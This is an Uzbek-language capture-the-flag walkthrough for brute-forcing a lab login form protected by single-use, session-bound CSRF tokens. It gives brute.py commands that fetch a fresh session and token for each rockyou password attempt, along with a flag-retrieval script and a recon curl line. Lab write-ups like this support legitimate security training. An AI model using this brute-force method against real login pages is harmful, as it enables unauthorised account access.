# 🎯 09 · Brute Force: CSRF-Protected Login — yechim

**Status:** vositalar tayyor (parol/flag sizning labingizda topiladi)
**Target:** `http://10.15.1.54:9009/`  (tavsifda `10.15.0.238:9009`)
**Username:** `jdoe` · Parol: rockyou ichida
**Qoida:** faqat 9009 port. Flag: `HTB{...}`.

---

## Nega oddiy hydra ishlamaydi
Login formasi **bir martalik (single-use), sessiyaga bog'langan CSRF token** bilan
himoyalangan. Ya'ni:
- token faqat **bir marta** ishlaydi → ikkinchi urinishda allaqachon "used";
- token **sessiya cookie**siga bog'langan → cookie'siz yaroqsiz.

Shu sababli har bir urinishda **yangi token + yangi sessiya** olish kerak.
Hydra buni qila olmaydi → **skript** yozish kerak (challenge ham shuni talab qiladi).

## Yechim — `brute.py --csrf-fresh`
`brute.py` ga shu rejim qo'shildi: har bir urinishda yangi cookie-jar bilan
login sahifani oladi, tokenni o'qiydi, keyin o'sha sessiya bilan POST qiladi.

```bash
python3 brute.py \
  --url        http://10.15.1.54:9009/login \
  --login-page http://10.15.1.54:9009/login \
  --username   jdoe \
  --csrf-fresh \
  --wordlist   /usr/share/wordlists/rockyou.txt \
  --fail       "Invalid" \
  --threads    16
```

Natija:
```
[+] PASSWORD FOUND: <PAROL>
[+] login succeeded (HTTP 200, ...)
[+] evidence: <h1>Welcome jdoe</h1><p>HTB{...}</p>
```

> **Muhim:** `--csrf-fresh` **shart**. Usiz (bir marta olingan token bilan)
> faqat birinchi urinish ishlaydi, qolganlari "Invalid CSRF token" bo'ladi.

## Bir buyruq bilan
```bash
chmod +x getflag_csrf.sh
./getflag_csrf.sh          # avval top-5000, keyin to'liq rockyou; flag'ni chiqaradi
```

## Agar login path boshqacha bo'lsa
```bash
curl -s http://10.15.1.54:9009/ | grep -iE 'action=|csrf|token'
# action="/login" bo'lmasa, --url/--login-page ni moslang
```

## Eslatmalar
- `--fail "Invalid"` — xato javobda "Invalid" bor (`Invalid CSRF token` ham,
  `Invalid username or password` ham). Muvaffaqiyatli javobda yo'q.
- Token maydoni nomi `csrf_token` bo'lmasa: `--csrf-field <nom>` qo'shing.
- Tezlik: `--threads 16..32`. Har urinish 2 ta so'rov (GET+POST), shuning uchun
  oddiy formadan ~2× sekin.
